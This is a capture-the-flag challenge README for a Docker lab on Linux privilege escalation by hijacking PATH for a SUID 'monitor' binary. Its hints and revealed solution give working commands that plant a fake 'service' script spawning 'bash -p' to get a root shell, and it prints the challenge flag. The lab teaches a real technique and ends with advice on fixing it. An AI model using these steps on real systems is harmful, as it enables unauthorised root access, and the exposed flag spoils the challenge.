# Challenge 2  PATH Hijacking via SUID Binary

**Difficulty:** Medium  
**Category:** Linux Privilege Escalation  
**Flag:** `/root/flag.txt`

---

## Story

Candie's overseers built a monitoring tool to check on operations across the stables.
They gave it the SUID bit so it could run privileged checks without handing out sudo.
The code is compiled — you can't read it directly. But you can observe what it does.

The problem: it calls another program by name alone, without specifying where to find it.
On this system, you control the path. That's all you need.

You are `player`. The SUID binary is at `/usr/local/bin/monitor`.
Calvin's private papers are in `/root/flag.txt`.

---

## Setup

```bash
docker build -t ctf-linux-med-2 .
docker run -it --rm ctf-linux-med-2
```

---

## Background: PATH Hijacking

When a program calls `system("some-command")`, the OS looks for `some-command`
in each directory listed in the `PATH` environment variable, left to right.

If you can prepend a writable directory to `PATH` and drop a malicious script
with the same name as `some-command`, the OS runs yours first.

When the calling binary is SUID root, your script runs as root.

---

## Hints

<details>
<summary>Hint 1</summary>
Run the binary and observe its output. What system command does it seem to be calling?

```bash
/usr/local/bin/monitor
```

Error messages often reveal the command name being invoked.
</details>

<details>
<summary>Hint 2</summary>
You can use `strings` to inspect the binary without decompiling it:

```bash
strings /usr/local/bin/monitor
```

Look for anything that looks like a shell command call.
</details>

<details>
<summary>Hint 3</summary>
Create a directory you control, put a fake `service` script in it that spawns a shell,
then prepend that directory to `PATH` before running the binary:

```bash
mkdir /tmp/hijack
echo '/bin/bash' > /tmp/hijack/service
chmod +x /tmp/hijack/service
export PATH=/tmp/hijack:$PATH
/usr/local/bin/monitor
```
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Step 1  Inspect the binary

```bash
strings /usr/local/bin/monitor
```

You'll see: `service apache2 status`  the binary calls `service` without a full path.

### Step 2  Create the malicious binary

```bash
mkdir /tmp/hijack
echo '#!/bin/bash' > /tmp/hijack/service
echo '/bin/bash -p' >> /tmp/hijack/service
chmod +x /tmp/hijack/service
```

`-p` preserves the effective UID (root) when bash starts.

### Step 3  Hijack PATH and trigger the binary

```bash
export PATH=/tmp/hijack:$PATH
/usr/local/bin/monitor
```

The SUID binary calls `system("service ...")`, the OS finds `/tmp/hijack/service` first,
and executes it as root.

### Step 4  Read the flag

```bash
cat /root/flag.txt
```

```
CTF{p4th_h1j4ck_v14_su1d}
```

### Why this works

`system()` in C uses `/bin/sh -c` under the hood, which inherits the calling process's
environment  including `PATH`. Because the binary called `setuid(0)` and has SUID set,
the forked shell runs as root. Any SUID binary that calls external programs without
absolute paths is vulnerable to this attack. Always use full paths (`/usr/sbin/service`)
in privileged code, or use `execve()` with a fixed path instead of `system()`.

</details>
